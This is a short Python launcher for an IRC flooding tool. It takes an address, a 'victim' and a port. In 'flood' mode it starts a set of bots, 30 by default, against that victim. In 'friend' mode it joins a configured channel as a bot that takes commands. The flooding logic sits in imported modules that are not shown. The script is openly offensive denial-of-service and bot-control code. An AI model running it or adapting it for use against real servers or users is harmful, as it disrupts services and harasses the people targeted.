#!/bin/python3.7
# -*- coding: cp1251 -*-
import sys
from irc import overlay
from irc import attacker
import configparser

def main():
 typ = "flood"
 count = 30
 if len(sys.argv) < 4:
  print (sys.argv[0]+" addr victim port")
  sys.exit()
 for arg in sys.argv:
  if "-type" in arg:
    typ=arg.split('=')[1]
  elif "-count" in arg:
    count=int(arg.split('=')[1])
 if typ=="flood":
  print("Start in flood mode")
  a=attacker.attack(sys.argv[1], sys.argv[2], p=int(sys.argv[3]), count=count )
  for bot in a.bots:
   bot.join()
  while True:
   pass
 elif typ=="friend":
  print("Start as just bot")
  config = configparser.ConfigParser()
  config.read("config.ini")
  config = config["BOT"]
  irc = overlay.IRCOverlay(config["serv_addr"],
                                                  config["nick"],
                                                   config["username"],
                                                   config["realname"])
  irc.cjoin(config["base_channel"])
  irc.hand.commands()
main()
